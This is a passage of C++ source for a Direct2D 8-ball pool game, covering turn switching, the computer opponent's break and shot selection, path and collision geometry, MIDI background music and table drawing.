            gameOverMessage = opponent.name + L"" Wins! ("" + shooter.name + L"" 8-ball in wrong pocket)"";
        }
        // 6) Otherwise, valid win
        else {
            gameOverMessage = shooter.name + L"" Wins!"";
        }

        currentGameState = GAME_OVER;
    } */


    // Switch the shooter, handle fouls and decide what state we go to next.
    // ────────────────────────────────────────────────────────────────
    //  SwitchTurns – final version (arrow–leak bug fixed)
    // ────────────────────────────────────────────────────────────────
    void SwitchTurns()
    {
        /* --------------------------------------------------------- */
        /* 1.  Hand the table over to the other player               */
        /* --------------------------------------------------------- */
        currentPlayer = (currentPlayer == 1) ? 2 : 1;

        /* --------------------------------------------------------- */
        /* 2.  Generic per–turn resets                               */
        /* --------------------------------------------------------- */
        isAiming = false;
        shotPower = 0.0f;
        currentlyHoveredPocket = -1;

        /* --------------------------------------------------------- */
        /* 3.  Wipe every previous pocket call                       */
        /*    (the new shooter will choose again if needed)          */
        /* --------------------------------------------------------- */
        calledPocketP1 = -1;
        calledPocketP2 = -1;
        pocketCallMessage.clear();

        /* --------------------------------------------------------- */
        /* 4.  Handle fouls — cue-ball in hand overrides everything  */
        /* --------------------------------------------------------- */
        if (foulCommitted)
        {
            if (currentPlayer == 1)            // human
            {
                currentGameState = BALL_IN_HAND_P1;
                aiTurnPending = false;
            }
            else                               // P2
            {
                currentGameState = BALL_IN_HAND_P2;
                aiTurnPending = isPlayer2AI;   // AI will place cue-ball
            }

            foulCommitted = false;
            return;                            // we're done for this frame
        }

        /* --------------------------------------------------------- */
        /* 5.  Normal flow                                           */
        /*    Will put us in  ∘ PLAYER?_TURN                         */
        /*                    ∘ CHOOSING_POCKET_P?                   */
        /*                    ∘ AI_THINKING  (for CPU)               */
        /* --------------------------------------------------------- */
        CheckAndTransitionToPocketChoice(currentPlayer);
    }


    void AIBreakShot() {
        Ball* cueBall = GetCueBall();
        if (!cueBall) return;

        // This function is called when it's AI's turn for the opening break and state is PRE_BREAK_PLACEMENT.
        // AI will place the cue ball and then plan the shot.
        if (isOpeningBreakShot && currentGameState == PRE_BREAK_PLACEMENT) {
            // Place cue ball in the kitchen randomly
            /*float kitchenMinX = TABLE_LEFT + BALL_RADIUS; // [cite: 1071, 1072, 1587]
            float kitchenMaxX = HEADSTRING_X - BALL_RADIUS; // [cite: 1072, 1078, 1588]
            float kitchenMinY = TABLE_TOP + BALL_RADIUS; // [cite: 1071, 1072, 1588]
            float kitchenMaxY = TABLE_BOTTOM - BALL_RADIUS; // [cite: 1072, 1073, 1589]*/

            // --- AI Places Cue Ball for Break ---
    // Decide if placing center or side. For simplicity, let's try placing slightly off-center
    // towards one side for a more angled break, or center for direct apex hit.
    // A common strategy is to hit the second ball of the rack.

            float placementY = RACK_POS_Y; // Align vertically with the rack center
            float placementX;

            // Randomly choose a side or center-ish placement for variation.
            int placementChoice = rand() % 3; // 0: Left-ish, 1: Center-ish, 2: Right-ish in kitchen

            if (placementChoice == 0) { // Left-ish
                placementX = HEADSTRING_X - (TABLE_WIDTH * 0.05f) - (BALL_RADIUS * (1 + (rand() % 3))); // Place slightly to the left within kitchen
            }
            else if (placementChoice == 2) { // Right-ish
                placementX = HEADSTRING_X - (TABLE_WIDTH * 0.05f) + (BALL_RADIUS * (1 + (rand() % 3))); // Place slightly to the right within kitchen
            }
            else { // Center-ish
                placementX = TABLE_LEFT + (HEADSTRING_X - TABLE_LEFT) * 0.5f; // Roughly center of kitchen
            }
            placementX = std::max(TABLE_LEFT + BALL_RADIUS + 1.0f, std::min(placementX, HEADSTRING_X - BALL_RADIUS - 1.0f)); // Clamp within kitchen X

            bool validPos = false;
            int attempts = 0;
            while (!validPos && attempts < 100) {
                /*cueBall->x = kitchenMinX + static_cast<float>(rand()) / (static_cast<float>(RAND_MAX) / (kitchenMaxX - kitchenMinX)); // [cite: 1589]
                cueBall->y = kitchenMinY + static_cast<float>(rand()) / (static_cast<float>(RAND_MAX) / (kitchenMaxY - kitchenMinY)); // [cite: 1590]
                if (IsValidCueBallPosition(cueBall->x, cueBall->y, true)) { // [cite: 1591]
                    validPos = true; // [cite: 1591]*/
                    // Try the chosen X, but vary Y slightly to find a clear spot
                cueBall->x = placementX;
                cueBall->y = placementY + (static_cast<float>(rand() % 100 - 50) / 100.0f) * BALL_RADIUS * 2.0f; // Vary Y a bit
                cueBall->y = std::max(TABLE_TOP + BALL_RADIUS + 1.0f, std::min(cueBall->y, TABLE_BOTTOM - BALL_RADIUS - 1.0f)); // Clamp Y

                if (IsValidCueBallPosition(cueBall->x, cueBall->y, true /* behind headstring */)) {
                    validPos = true;
                }
                attempts++; // [cite: 1592]
            }
            if (!validPos) {
                // Fallback position
                /*cueBall->x = TABLE_LEFT + (HEADSTRING_X - TABLE_LEFT) * 0.5f; // [cite: 1071, 1078, 1593]
                cueBall->y = (TABLE_TOP + TABLE_BOTTOM) * 0.5f; // [cite: 1071, 1073, 1594]
                if (!IsValidCueBallPosition(cueBall->x, cueBall->y, true)) { // [cite: 1594]
                    cueBall->x = HEADSTRING_X - BALL_RADIUS * 2; // [cite: 1072, 1078, 1594]
                    cueBall->y = RACK_POS_Y; // [cite: 1080, 1595]
                }
            }
            cueBall->vx = 0; // [cite: 1595]
            cueBall->vy = 0; // [cite: 1596]

            // Plan a break shot: aim at the center of the rack (apex ball)
            float targetX = RACK_POS_X; // [cite: 1079] Aim for the apex ball X-coordinate
            float targetY = RACK_POS_Y; // [cite: 1080] Aim for the apex ball Y-coordinate

            float dx = targetX - cueBall->x; // [cite: 1599]
            float dy = targetY - cueBall->y; // [cite: 1600]
            float shotAngle = atan2f(dy, dx); // [cite: 1600]
            float shotPowerValue = MAX_SHOT_POWER; // [cite: 1076, 1600] Use MAX_SHOT_POWER*/

                cueBall->x = TABLE_LEFT + (HEADSTRING_X - TABLE_LEFT) * 0.75f; // A default safe spot in kitchen
                cueBall->y = RACK_POS_Y;
            }
            cueBall->vx = 0; cueBall->vy = 0;

            // --- AI Plans the Break Shot ---
            float targetX, targetY;
            // If cue ball is near center of kitchen width, aim for apex.
            // Otherwise, aim for the second ball on the side the cue ball is on (for a cut break).
            float kitchenCenterRegion = (HEADSTRING_X - TABLE_LEFT) * 0.3f; // Define a ""center"" region
            if (std::abs(cueBall->x - (TABLE_LEFT + (HEADSTRING_X - TABLE_LEFT) / 2.0f)) < kitchenCenterRegion / 2.0f) {
                // Center-ish placement: Aim for the apex ball (ball ID 1 or first ball in rack)
                targetX = RACK_POS_X; // Apex ball X
                targetY = RACK_POS_Y; // Apex ball Y
            }
            else {
                // Side placement: Aim to hit the ""second"" ball of the rack for a wider spread.
                // This is a simplification. A more robust way is to find the actual second ball.
                // For now, aim slightly off the apex towards the side the cue ball is on.
                targetX = RACK_POS_X + BALL_RADIUS * 2.0f * 0.866f; // X of the second row of balls
                targetY = RACK_POS_Y + ((cueBall->y > RACK_POS_Y) ? -BALL_RADIUS : BALL_RADIUS); // Aim at the upper or lower of the two second-row balls
            }

            float dx = targetX - cueBall->x;
            float dy = targetY - cueBall->y;
            float shotAngle = atan2f(dy, dx);
            float shotPowerValue = MAX_SHOT_POWER * (0.9f + (rand() % 11) / 100.0f); // Slightly vary max power

            // Store planned shot details for the AI
            /*aiPlannedShotDetails.angle = shotAngle; // [cite: 1102, 1601]
            aiPlannedShotDetails.power = shotPowerValue; // [cite: 1102, 1601]
            aiPlannedShotDetails.spinX = 0.0f; // [cite: 1102, 1601] No spin for a standard power break
            aiPlannedShotDetails.spinY = 0.0f; // [cite: 1103, 1602]
            aiPlannedShotDetails.isValid = true; // [cite: 1103, 1602]*/

            aiPlannedShotDetails.angle = shotAngle;
            aiPlannedShotDetails.power = shotPowerValue;
            aiPlannedShotDetails.spinX = 0.0f; // No spin for break usually
            aiPlannedShotDetails.spinY = 0.0f;
            aiPlannedShotDetails.isValid = true;

            // Update global cue parameters for immediate visual feedback if DrawAimingAids uses them
            /*::cueAngle = aiPlannedShotDetails.angle;      // [cite: 1109, 1603] Update global cueAngle
            ::shotPower = aiPlannedShotDetails.power;     // [cite: 1109, 1604] Update global shotPower
            ::cueSpinX = aiPlannedShotDetails.spinX;    // [cite: 1109]
            ::cueSpinY = aiPlannedShotDetails.spinY;    // [cite: 1110]*/

            ::cueAngle = aiPlannedShotDetails.angle;
            ::shotPower = aiPlannedShotDetails.power;
            ::cueSpinX = aiPlannedShotDetails.spinX;
            ::cueSpinY = aiPlannedShotDetails.spinY;

            // Set up for AI display via GameUpdate
            /*aiIsDisplayingAim = true;                   // [cite: 1104] Enable AI aiming visualization
            aiAimDisplayFramesLeft = AI_AIM_DISPLAY_DURATION_FRAMES; // [cite: 1105] Set duration for display

            currentGameState = AI_THINKING; // [cite: 1081] Transition to AI_THINKING state.
                                            // GameUpdate will handle the aiAimDisplayFramesLeft countdown
                                            // and then execute the shot using aiPlannedShotDetails.
                                            // isOpeningBreakShot will be set to false within ApplyShot.

            // No immediate ApplyShot or sound here; GameUpdate's AI execution logic will handle it.*/

            aiIsDisplayingAim = true;
            aiAimDisplayFramesLeft = AI_AIM_DISPLAY_DURATION_FRAMES;
            currentGameState = AI_THINKING; // State changes to AI_THINKING, GameUpdate will handle shot execution after display
            aiTurnPending = false;

            return; // The break shot is now planned and will be executed by GameUpdate
        }

        // 2. If not in PRE_BREAK_PLACEMENT (e.g., if this function were called at other times,
        //    though current game logic only calls it for PRE_BREAK_PLACEMENT)
        //    This part can be extended if AIBreakShot needs to handle other scenarios.
        //    For now, the primary logic is above.
    }

    // --- Helper Functions ---

    Ball* GetBallById(int id) {
        for (size_t i = 0; i < balls.size(); ++i) {
            if (balls[i].id == id) {
                return &balls[i];
            }
        }
        return nullptr;
    }

    Ball* GetCueBall() {
        return GetBallById(0);
    }

    float GetDistance(float x1, float y1, float x2, float y2) {
        return sqrtf(GetDistanceSq(x1, y1, x2, y2));
    }

    float GetDistanceSq(float x1, float y1, float x2, float y2) {
        float dx = x2 - x1;
        float dy = y2 - y1;
        return dx * dx + dy * dy;
    }

    bool IsValidCueBallPosition(float x, float y, bool checkHeadstring) {
        // Basic bounds check (inside cushions)
        float left = TABLE_LEFT + CUSHION_THICKNESS + BALL_RADIUS;
        float right = TABLE_RIGHT - CUSHION_THICKNESS - BALL_RADIUS;
        float top = TABLE_TOP + CUSHION_THICKNESS + BALL_RADIUS;
        float bottom = TABLE_BOTTOM - CUSHION_THICKNESS - BALL_RADIUS;

        if (x < left || x > right || y < top || y > bottom) {
            return false;
        }

        // Check headstring restriction if needed
        if (checkHeadstring && x >= HEADSTRING_X) {
            return false;
        }

        // Check overlap with other balls
        for (size_t i = 0; i < balls.size(); ++i) {
            if (balls[i].id != 0 && !balls[i].isPocketed) { // Don't check against itself or pocketed balls
                if (GetDistanceSq(x, y, balls[i].x, balls[i].y) < (BALL_RADIUS * 2.0f) * (BALL_RADIUS * 2.0f)) {
                    return false; // Overlapping another ball
                }
            }
        }

        return true;
    }

    // --- NEW HELPER FUNCTION IMPLEMENTATIONS ---

    // Checks if a player has pocketed all their balls and is now on the 8-ball.
    bool IsPlayerOnEightBall(int player) {
        PlayerInfo& playerInfo = (player == 1) ? player1Info : player2Info;
        if (playerInfo.assignedType != BallType::NONE && playerInfo.assignedType != BallType::EIGHT_BALL && playerInfo.ballsPocketedCount >= 7) {
            Ball* eightBall = GetBallById(8);
            return (eightBall && !eightBall->isPocketed);
        }
        return false;
    }

    void CheckAndTransitionToPocketChoice(int playerID) {
        bool needsToCall = IsPlayerOnEightBall(playerID);

        if (needsToCall) {
            if (playerID == 1) { // Human Player 1
                currentGameState = CHOOSING_POCKET_P1;
                pocketCallMessage = player1Info.name + L"": Choose a pocket for the 8-Ball..."";
                if (calledPocketP1 == -1) calledPocketP1 = 2; // Default to bottom-right
            }
            else { // Player 2
                if (isPlayer2AI) {
                    // FOOLPROOF FIX: AI doesn't choose here. It transitions to a thinking state.
                    // AIMakeDecision will handle the choice and the pocket call.
                    currentGameState = AI_THINKING;
                    aiTurnPending = true; // Signal the main loop to run AIMakeDecision
                }
                else { // Human Player 2
                    currentGameState = CHOOSING_POCKET_P2;
                    pocketCallMessage = player2Info.name + L"": Choose a pocket for the 8-Ball..."";
                    if (calledPocketP2 == -1) calledPocketP2 = 2; // Default to bottom-right
                }
            }
        }
        else {
            // Player does not need to call a pocket, proceed to normal turn.
            pocketCallMessage = L"""";
            currentGameState = (playerID == 1) ? PLAYER1_TURN : PLAYER2_TURN;
            if (playerID == 2 && isPlayer2AI) {
                aiTurnPending = true;
            }
        }
    }


    template <typename T>
    void SafeRelease(T** ppT) {
        if (*ppT) {
            (*ppT)->Release();
            *ppT = nullptr;
        }
    }

    // --- CPU Ball?in?Hand Placement --------------------------------
    // Moves the cue ball to a legal ""ball in hand"" position for the AI.
    void AIPlaceCueBall() {
        Ball* cue = GetCueBall();
        if (!cue) return;

        // Simple strategy: place back behind the headstring at the standard break spot
        cue->x = TABLE_LEFT + TABLE_WIDTH * 0.15f;
        cue->y = RACK_POS_Y;
        cue->vx = cue->vy = 0.0f;
    }

    // --- Helper Function for Line Segment Intersection ---
    // Finds intersection point of line segment P1->P2 and line segment P3->P4
    // Returns true if they intersect, false otherwise. Stores intersection point in 'intersection'.
    bool LineSegmentIntersection(D2D1_POINT_2F p1, D2D1_POINT_2F p2, D2D1_POINT_2F p3, D2D1_POINT_2F p4, D2D1_POINT_2F& intersection)
    {
        float denominator = (p4.y - p3.y) * (p2.x - p1.x) - (p4.x - p3.x) * (p2.y - p1.y);

        // Check if lines are parallel or collinear
        if (fabs(denominator) < 1e-6) {
            return false;
        }

        float ua = ((p4.x - p3.x) * (p1.y - p3.y) - (p4.y - p3.y) * (p1.x - p3.x)) / denominator;
        float ub = ((p2.x - p1.x) * (p1.y - p3.y) - (p2.y - p1.y) * (p1.x - p3.x)) / denominator;

        // Check if intersection point lies on both segments
        if (ua >= 0.0f && ua <= 1.0f && ub >= 0.0f && ub <= 1.0f) {
            intersection.x = p1.x + ua * (p2.x - p1.x);
            intersection.y = p1.y + ua * (p2.y - p1.y);
            return true;
        }

        return false;
    }

    // --- INSERT NEW HELPER FUNCTION HERE ---
    // Calculates the squared distance from point P to the line segment AB.
    float PointToLineSegmentDistanceSq(D2D1_POINT_2F p, D2D1_POINT_2F a, D2D1_POINT_2F b) {
        float l2 = GetDistanceSq(a.x, a.y, b.x, b.y);
        if (l2 == 0.0f) return GetDistanceSq(p.x, p.y, a.x, a.y); // Segment is a point
        // Consider P projecting onto the line AB infinite line
        // t = [(P-A) . (B-A)] / |B-A|^2
        float t = ((p.x - a.x) * (b.x - a.x) + (p.y - a.y) * (b.y - a.y)) / l2;
        t = std::max(0.0f, std::min(1.0f, t)); // Clamp t to the segment [0, 1]
        // Projection falls on the segment
        D2D1_POINT_2F projection = D2D1::Point2F(a.x + t * (b.x - a.x), a.y + t * (b.y - a.y));
        return GetDistanceSq(p.x, p.y, projection.x, projection.y);
    }
    // --- End New Helper ---

    // --- NEW AI Implementation Functions ---

    void AIMakeDecision() {
        // Start with a clean slate for the AI's plan.
        aiPlannedShotDetails.isValid = false;
        Ball* cueBall = GetCueBall();
        if (!cueBall || !isPlayer2AI || currentPlayer != 2) return;

        // Ask the ""expert"" (AIFindBestShot) for the best possible shot.
        AIShotInfo bestShot = AIFindBestShot();

        if (bestShot.possible) {
            // A good shot was found.
            // If it's an 8-ball shot, ""call"" the pocket.
            if (bestShot.involves8Ball) {
                calledPocketP2 = bestShot.pocketIndex;
            }
            else {
                calledPocketP2 = -1; // Ensure no pocket is called on a normal shot.
            }

            // Commit the details of the best shot to the AI's plan.
            aiPlannedShotDetails.angle = bestShot.angle;
            aiPlannedShotDetails.power = bestShot.power;
            aiPlannedShotDetails.spinX = bestShot.spinX;
            aiPlannedShotDetails.spinY = bestShot.spinY;
            aiPlannedShotDetails.isValid = true;

        }
        else {
            // No good offensive shot found, must play a safe defensive shot.
            // (This is a fallback and your current AIFindBestShot should prevent this)
            aiPlannedShotDetails.isValid = false;
        }

        // --- FOOLPROOF FIX: Trigger the Aim Display ---
        // If any valid plan was made, update the visuals and start the display pause.
        if (aiPlannedShotDetails.isValid) {

            // STEP 1: Copy the AI's plan into the global variables used for drawing.
            // This is the critical missing link.
            cueAngle = aiPlannedShotDetails.angle;
            shotPower = aiPlannedShotDetails.power;

            // STEP 2: Trigger the visual display pause.
            // These are the two lines you correctly identified.
            aiIsDisplayingAim = true;
            aiAimDisplayFramesLeft = AI_AIM_DISPLAY_DURATION_FRAMES;

        }
        else {
            // Absolute fallback: If no plan could be made, switch turns to prevent a freeze.
            SwitchTurns();
        }
    }


    AIShotInfo AIFindBestShot()
    {
        AIShotInfo best;                       // .possible == false
        Ball* cue = GetCueBall();
        if (!cue) return best;

        const bool on8 = IsPlayerOnEightBall(2);
        const BallType wantType = player2Info.assignedType;

        for (Ball& b : balls)
        {
            if (b.isPocketed || b.id == 0) continue;

            // decide if this ball is a legal/interesting target
            bool ok =
                on8 ? (b.id == 8) :
                ((wantType == BallType::NONE) || (b.type == wantType));

            if (!ok) continue;

            for (int p = 0; p < 6; ++p)
            {
                AIShotInfo cand = EvaluateShot(&b, p);
                if (cand.possible &&
                    (!best.possible || cand.score > best.score))
                    best = cand;
            }
        }

        // fall-back: tap cue ball forward (safety) if no potting line exists
        if (!best.possible && cue)
        {
            best.possible = true;
            best.angle = static_cast<float>(rand()) / RAND_MAX * 2.0f * PI;
            best.power = MAX_SHOT_POWER * 0.30f;
            best.spinX = best.spinY = 0.0f;
            best.targetBall = nullptr;
            best.score = -99999.0f;
            best.pocketIndex = -1;
        }
        return best;
    }


    // Evaluate a potential shot at a specific target ball towards a specific pocket
    AIShotInfo EvaluateShot(Ball* targetBall, int pocketIndex) {
        AIShotInfo shotInfo; // Defaults to not possible
        shotInfo.targetBall = targetBall;
        shotInfo.pocketIndex = pocketIndex;
        shotInfo.involves8Ball = (targetBall && targetBall->id == 8);

        Ball* cueBall = GetCueBall();
        if (!cueBall || !targetBall) return shotInfo;

        // 1. Calculate Ghost Ball position (where cue must hit target)
        shotInfo.ghostBallPos = CalculateGhostBallPos(targetBall, pocketIndex);

        // 2. Check Path: Cue Ball -> Ghost Ball Position
        if (!IsPathClear(D2D1::Point2F(cueBall->x, cueBall->y), shotInfo.ghostBallPos, cueBall->id, targetBall->id)) {
            return shotInfo; // Path blocked, shot is impossible.
        }

        // 3. Calculate Angle and Power
        float dx = shotInfo.ghostBallPos.x - cueBall->x;
        float dy = shotInfo.ghostBallPos.y - cueBall->y;
        shotInfo.angle = atan2f(dy, dx);

        float cueToGhostDist = GetDistance(cueBall->x, cueBall->y, shotInfo.ghostBallPos.x, shotInfo.ghostBallPos.y);
        float targetToPocketDist = GetDistance(targetBall->x, targetBall->y, pocketPositions[pocketIndex].x, pocketPositions[pocketIndex].y);
        shotInfo.power = CalculateShotPower(cueToGhostDist, targetToPocketDist);

        // 4. Score the shot (simple scoring: closer and straighter is better)
        shotInfo.score = 1000.0f - (cueToGhostDist + targetToPocketDist);

        // If we reached here, the shot is geometrically possible.
        shotInfo.possible = true;
        return shotInfo;
    }


    //  Estimate the power that will carry the cue-ball to the ghost position
    //  *and* push the object-ball the remaining distance to the pocket.
    //
    //  • cueToGhostDist    – pixels from cue to ghost-ball centre
    //  • targetToPocketDist– pixels from object-ball to chosen pocket
    //
    //  The function is fully deterministic (good for AI search) yet produces
    //  human-looking power levels.
    //
    float CalculateShotPower(float cueToGhostDist, float targetToPocketDist)
    {
        // Total distance the *energy* must cover (cue path + object-ball path)
        float totalDist = cueToGhostDist + targetToPocketDist;

        // Typical diagonal of the playable area (approx.) – used for scaling
        constexpr float TABLE_DIAG = 900.0f;

        // 1.  Convert distance to a 0-1 number (0: tap-in, 1: table length)
        float norm = std::clamp(totalDist / TABLE_DIAG, 0.0f, 1.0f);

        // 2.  Ease-in curve (smoothstep) for nicer progression
        norm = norm * norm * (3.0f - 2.0f * norm);

        // 3.  Blend between a gentle minimum and the absolute maximum
        const float MIN_POWER = MAX_SHOT_POWER * 0.18f;     // just enough to move
        float power = MIN_POWER + norm * (MAX_SHOT_POWER - MIN_POWER);

        // 4.  Safety clamp (also screens out degenerate calls)
        power = std::clamp(power, 0.15f, MAX_SHOT_POWER);

        return power;
    }

    // ------------------------------------------------------------------
    //  Return the ghost-ball centre needed for the target ball to roll
    //  straight into the chosen pocket.
    // ------------------------------------------------------------------
    D2D1_POINT_2F CalculateGhostBallPos(Ball* targetBall, int pocketIndex)
    {
        if (!targetBall) return D2D1::Point2F(0, 0);

        D2D1_POINT_2F P = pocketPositions[pocketIndex];

        float vx = P.x - targetBall->x;
        float vy = P.y - targetBall->y;
        float L = sqrtf(vx * vx + vy * vy);
        if (L < 1.0f) L = 1.0f;                // safety

        vx /= L;   vy /= L;

        return D2D1::Point2F(
            targetBall->x - vx * (BALL_RADIUS * 2.0f),
            targetBall->y - vy * (BALL_RADIUS * 2.0f));
    }

    // Calculate the position the cue ball needs to hit for the target ball to go towards the pocket
    // ────────────────────────────────────────────────────────────────
    //   2.  Shot evaluation & search
    // ────────────────────────────────────────────────────────────────

    //  Calculate ghost-ball position so that cue hits target towards pocket
    static inline D2D1_POINT_2F GhostPos(const Ball* tgt, int pocketIdx)
    {
        D2D1_POINT_2F P = pocketPositions[pocketIdx];
        float vx = P.x - tgt->x;
        float vy = P.y - tgt->y;
        float L = sqrtf(vx * vx + vy * vy);
        vx /= L;  vy /= L;
        return D2D1::Point2F(tgt->x - vx * (BALL_RADIUS * 2.0f),
            tgt->y - vy * (BALL_RADIUS * 2.0f));
    }

    //  Heuristic: shorter + straighter + proper group = higher score
    static inline float ScoreShot(float cue2Ghost,
        float tgt2Pocket,
        bool  correctGroup,
        bool  involves8)
    {
        float base = 2000.0f - (cue2Ghost + tgt2Pocket);   // prefer close shots
        if (!correctGroup)  base -= 400.0f;                  // penalty
        if (involves8)      base += 150.0f;                  // a bit more desirable
        return base;
    }

    // Checks if line segment is clear of obstructing balls
    // ────────────────────────────────────────────────────────────────
    //   1.  Low-level helpers – IsPathClear & FindFirstHitBall
    // ────────────────────────────────────────────────────────────────

    //  Test if the capsule [ start … end ] (radius = BALL_RADIUS)
    //  intersects any ball except the ids we want to ignore.
    bool IsPathClear(D2D1_POINT_2F start,
        D2D1_POINT_2F end,
        int ignoredBallId1,
        int ignoredBallId2)
    {
        float dx = end.x - start.x;
        float dy = end.y - start.y;
        float lenSq = dx * dx + dy * dy;
        if (lenSq < 1e-3f) return true;             // degenerate → treat as clear

        for (const Ball& b : balls)
        {
            if (b.isPocketed)      continue;
            if (b.id == ignoredBallId1 ||
                b.id == ignoredBallId2)             continue;

            // project ball centre onto the segment
            float t = ((b.x - start.x) * dx + (b.y - start.y) * dy) / lenSq;
            t = std::clamp(t, 0.0f, 1.0f);

            float cx = start.x + t * dx;
            float cy = start.y + t * dy;

            if (GetDistanceSq(b.x, b.y, cx, cy) < (BALL_RADIUS * BALL_RADIUS))
                return false;                       // blocked
        }
        return true;
    }

    //  Cast an (infinite) ray and return the first non-pocketed ball hit.
    //  `hitDistSq` is distance² from the start point to the collision point.
    Ball* FindFirstHitBall(D2D1_POINT_2F start,
        float        angle,
        float& hitDistSq)
    {
        Ball* hitBall = nullptr;
        float  bestSq = std::numeric_limits<float>::max();
        float  cosA = cosf(angle);
        float  sinA = sinf(angle);

        for (Ball& b : balls)
        {
            if (b.id == 0 || b.isPocketed) continue;         // ignore cue & sunk balls

            float relX = b.x - start.x;
            float relY = b.y - start.y;
            float proj = relX * cosA + relY * sinA;          // distance along the ray

            if (proj <= 0) continue;                         // behind cue

            // closest approach of the ray to the sphere centre
            float closestX = start.x + proj * cosA;
            float closestY = start.y + proj * sinA;
            float dSq = GetDistanceSq(b.x, b.y, closestX, closestY);

            if (dSq <= BALL_RADIUS * BALL_RADIUS)            // intersection
            {
                float back = sqrtf(BALL_RADIUS * BALL_RADIUS - dSq);
                float collDist = proj - back;                // front surface
                float collSq = collDist * collDist;
                if (collSq < bestSq)
                {
                    bestSq = collSq;
                    hitBall = &b;
                }
            }
        }
        hitDistSq = bestSq;
        return hitBall;
    }

    // Basic check for reasonable AI aim angles (optional)
    bool IsValidAIAimAngle(float angle) {
        // Placeholder - could check for NaN or infinity if calculations go wrong
        return isfinite(angle);
    }

    //midi func = start
    void PlayMidiInBackground(HWND hwnd, const TCHAR* midiPath) {
        while (isMusicPlaying) {
            MCI_OPEN_PARMS mciOpen = { 0 };
            mciOpen.lpstrDeviceType = TEXT(""sequencer"");
            mciOpen.lpstrElementName = midiPath;

            if (mciSendCommand(0, MCI_OPEN, MCI_OPEN_TYPE | MCI_OPEN_ELEMENT, (DWORD_PTR)&mciOpen) == 0) {
                midiDeviceID = mciOpen.wDeviceID;

                MCI_PLAY_PARMS mciPlay = { 0 };
                mciSendCommand(midiDeviceID, MCI_PLAY, 0, (DWORD_PTR)&mciPlay);

                // Wait for playback to complete
                MCI_STATUS_PARMS mciStatus = { 0 };
                mciStatus.dwItem = MCI_STATUS_MODE;

                do {
                    mciSendCommand(midiDeviceID, MCI_STATUS, MCI_STATUS_ITEM, (DWORD_PTR)&mciStatus);
                    Sleep(100); // adjust as needed
                } while (mciStatus.dwReturn == MCI_MODE_PLAY && isMusicPlaying);

                mciSendCommand(midiDeviceID, MCI_CLOSE, 0, NULL);
                midiDeviceID = 0;
            }
        }
    }

    void StartMidi(HWND hwnd, const TCHAR* midiPath) {
        if (isMusicPlaying) {
            StopMidi();
        }
        isMusicPlaying = true;
        musicThread = std::thread(PlayMidiInBackground, hwnd, midiPath);
    }

    void StopMidi() {
        if (isMusicPlaying) {
            isMusicPlaying = false;
            if (musicThread.joinable()) musicThread.join();
            if (midiDeviceID != 0) {
                mciSendCommand(midiDeviceID, MCI_CLOSE, 0, NULL);
                midiDeviceID = 0;
            }
        }
    }

    /*void PlayGameMusic(HWND hwnd) {
        // Stop any existing playback
        if (isMusicPlaying) {
            isMusicPlaying = false;
            if (musicThread.joinable()) {
                musicThread.join();
            }
            if (midiDeviceID != 0) {
                mciSendCommand(midiDeviceID, MCI_CLOSE, 0, NULL);
                midiDeviceID = 0;
            }
        }

        // Get the path of the executable
        TCHAR exePath[MAX_PATH];
        GetModuleFileName(NULL, exePath, MAX_PATH);

        // Extract the directory path
        TCHAR* lastBackslash = _tcsrchr(exePath, '\\');
        if (lastBackslash != NULL) {
            *(lastBackslash + 1) = '\0';
        }

        // Construct the full path to the MIDI file
        static TCHAR midiPath[MAX_PATH];
        _tcscpy_s(midiPath, MAX_PATH, exePath);
        _tcscat_s(midiPath, MAX_PATH, TEXT(""BSQ.MID""));

        // Start the background playback
        isMusicPlaying = true;
        musicThread = std::thread(PlayMidiInBackground, hwnd, midiPath);
    }*/
    //midi func = end

    // --- Drawing Functions ---

    void OnPaint() {
        HRESULT hr = CreateDeviceResources(); // Ensure resources are valid

        if (SUCCEEDED(hr)) {
            pRenderTarget->BeginDraw();
            DrawScene(pRenderTarget); // Pass render target
            hr = pRenderTarget->EndDraw();

            if (hr == D2DERR_RECREATE_TARGET) {
                DiscardDeviceResources();
                // Optionally request another paint message: InvalidateRect(hwndMain, NULL, FALSE);
                // But the timer loop will trigger redraw anyway.
            }
        }
        // If CreateDeviceResources failed, EndDraw might not be called.
        // Consider handling this more robustly if needed.
    }

    void DrawScene(ID2D1RenderTarget* pRT) {
        if (!pRT) return;

        //pRT->Clear(D2D1::ColorF(D2D1::ColorF::LightGray)); // Background color
        // Set background color to #ffffcd (RGB: 255, 255, 205)
        pRT->Clear(D2D1::ColorF(0.3686f, 0.5333f, 0.3882f)); // Clear with light yellow background NEWCOLOR 1.0f, 1.0f, 0.803f => (0.3686f, 0.5333f, 0.3882f)
        //pRT->Clear(D2D1::ColorF(1.0f, 1.0f, 0.803f)); // Clear with light yellow background NEWCOLOR 1.0f, 1.0f, 0.803f => (0.3686f, 0.5333f, 0.3882f)

        DrawTable(pRT, pFactory);
        DrawPocketSelectionIndicator(pRT); // Draw arrow over selected/called pocket
        DrawBalls(pRT);
        DrawAimingAids(pRT); // Includes cue stick if aiming
        DrawUI(pRT);
        DrawPowerMeter(pRT);
        DrawSpinIndicator(pRT);
        DrawPocketedBallsIndicator(pRT);
        DrawBallInHandIndicator(pRT); // Draw cue ball ghost if placing

         // Draw Game Over Message
        if (currentGameState == GAME_OVER && pTextFormat) {
            ID2D1SolidColorBrush* pBrush = nullptr;
            pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pBrush);
            if (pBrush) {
                D2D1_RECT_F layoutRect = D2D1::RectF(TABLE_LEFT, TABLE_TOP + TABLE_HEIGHT / 2 - 30, TABLE_RIGHT, TABLE_TOP + TABLE_HEIGHT / 2 + 30);
                pRT->DrawText(
                    gameOverMessage.c_str(),
                    (UINT32)gameOverMessage.length(),
                    pTextFormat, // Use large format maybe?
                    &layoutRect,
                    pBrush
                );
                SafeRelease(&pBrush);
            }
        }

    }

    void DrawTable(ID2D1RenderTarget* pRT, ID2D1Factory* pFactory) {
        ID2D1SolidColorBrush* pBrush = nullptr;

        // === Draw Full Orange Frame (Table Border) ===
        ID2D1SolidColorBrush* pFrameBrush = nullptr;
        pRT->CreateSolidColorBrush(D2D1::ColorF(0.9157f, 0.6157f, 0.2000f), &pFrameBrush); //NEWCOLOR ::Orange (no brackets) => (0.9157, 0.6157, 0.2000)
        //pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Orange), &pFrameBrush); //NEWCOLOR ::Orange (no brackets) => (0.9157, 0.6157, 0.2000)
        if (pFrameBrush) {
            D2D1_RECT_F outerRect = D2D1::RectF(
                TABLE_LEFT - CUSHION_THICKNESS,
                TABLE_TOP - CUSHION_THICKNESS,
                TABLE_RIGHT + CUSHION_THICKNESS,
